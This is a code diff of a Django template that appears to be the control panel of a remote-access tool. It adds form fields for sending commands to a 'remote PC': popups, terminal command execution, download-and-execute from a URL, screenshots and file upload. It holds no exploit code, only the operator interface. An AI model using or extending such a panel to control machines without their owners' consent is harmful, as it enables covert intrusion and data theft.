@@ -10,6 +10,16 @@
             integrity="sha256-BJeo0qm959uMBGb65z40ejJYGSgR7REI4+CW1fNKwOg="
             crossorigin="anonymous">
     </script>
+    <script>
+        $(document).ready(function(){
+            $('input[type="radio"]').click(function(){
+                var command = $(this).val();
+                $("div.form-area-last-command-args-field-empty").hide();
+                $("div.form-area-last-command-args-field").hide();
+                $("#form_area_" + command + "_args_field").show();
+            });
+        });
+    </script>
 </head>
 <body>
     <div id="header_area" class="header-area">
@@ -25,8 +35,7 @@
 
         </pre>
     </div>
-
-        <form method="POST" >
+        <form method="POST" id="command_form">
             <div id="form_area" class="form-area">
                 {% csrf_token %}
                 {{ form.non_field_errors }}
@@ -47,7 +56,81 @@
                     {{ form.last_command.errors }}
                     {{ form.last_command }}
                 </div>
-                <div id="form_area_last_command_args_field" class="form-area-last-command-args-field">
+                <div id="form_area_last_command_args_field_empty" class="form-area-last-command-args-field-empty">
+                    <label>Command args:</label>
+                    <p>Please select radio button with type of command to see required arguments</p>
+                </div>
+                <div id="form_area_popup_args_field" class="form-area-last-command-args-field">
+                    <label>Popup args:</label>
+                    <div class="arg-field">
+                        <label for="title">Title: </label>
+                        <textarea name="title" required id="title"></textarea>
+                    </div>
+                    <div class="arg-field">
+                        <label for="text">Text: </label>
+                        <textarea name="text" required id="text"></textarea>
+                    </div>
+                </div>
+                <div id="form_area_run_command_args_field" class="form-area-last-command-args-field">
+                    <label>Run command args:</label>
+                    <div class="arg-field">
+                        <label for="terminal">Terminal:</label>
+                         <select name = "terminal" required id="terminal">
+                            <option value = "True" selected>True</option>
+                            <option value = "False">False</option>
+                         </select>
+                    </div>
+                    <div class="arg-field">
+                        <label for="arg0">Arg0:</label>
+                        <textarea name="arg0" required id="arg0"></textarea>
+                    </div>
+                    <div class="arg-field">
+                        <label for="arg1">Arg1:</label>
+                        <textarea name="arg1" required id="arg1"></textarea>
+                    </div>
+                    <div class="arg-field">
+                        <label for="arg2">Arg2:</label>
+                        <textarea name="arg2" required id="arg2"></textarea>
+                    </div>
+                    <div class="arg-field">
+                        <label for="arg3">Arg3:</label>
+                        <textarea name="arg3" required id="arg3"></textarea>
+                    </div>
+                    <div class="arg-field">
+                        <label for="arg4">Arg4:</label>
+                        <textarea name="arg4" required id="arg4"></textarea>
+                    </div>
+                </div>
+                <div id="form_area_file_download_args_field" class="form-area-last-command-args-field">
+                    <label>Download file args</label>
+                    <div class="arg-field">
+                        <label for="url">URL:</label>
+                        <textarea name="url" required id="url"></textarea>
+                    </div>
+                    <div class="arg-field">
+                        <label for="d_path">Save path on remote PC:</label>
+                        <textarea name="d_path" required id="d_path"></textarea>
+                    </div>
+                    <div class="arg-field">
+                        <label for="arg0">Execute:</label>
+                         <select name = "execute" required id="execute">
+                            <option value = "True" selected>True</option>
+                            <option value = "False">False</option>
+                         </select>
+                    </div>
+                </div>
+                <div id="form_area_screenshoot_args_field" class="form-area-last-command-args-field">
+                    <label>Screenshoot args:</label>
+                    <p>Screenshoot command has no args</p>
+                </div>
+                <div id="form_area_file_upload_args_field" class="form-area-last-command-args-field">
+                    <label>Upload file args</label>
+                    <div class="arg-field">
+                        <label for="file_path">Save path on remote PC:</label>
+                        <textarea name="file_path" required id="file_path"></textarea>
+                    </div>
+                </div>
+                <div id="form_area_last_command_args_field" class="form-area-last-command-args-field-test">
                     {{ form.last_command_args.label_tag }}
                     {{ form.last_command_args.errors }}
                     {{ form.last_command_args }}
@@ -55,7 +138,34 @@
             </div>
             <button class="send-command" type="submit">GO!</button>
         </form>
+        <script>
+            $(document).ready(function() {
+                console.log('sraka');
+                $('.send-command').click(function() {
+                    // e.preventDefault();
+                    console.log('sraka2');
 
+                    var args_dict = {};
+                    var selected_command = $('#form_area_last_command_field input:checked').attr('value');
+                    alert(selected_command);
+
+                    $('#form_area_' + selected_command + '_args_field input').each(function () {
+                        args_dict[this.id] = this.value;
+                    });
+                    $('#form_area_' + selected_command + '_args_field textarea').each(function () {
+                        args_dict[this.id] = this.value;
+                    });
+                    $('#form_area_' + selected_command + '_args_field select').each(function () {
+                        args_dict[this.id] = this.value;
+                    });
+                    // console.log(arg_dict);
+                    args_json = JSON.stringify(args_dict);
+                    console.log(args_json);
+
+                    $('#id_last_command_args').val(args_json);
+                });
+            });
+        </script>
     <table class="client-table">
         <tr>
             <th>Pos</th>
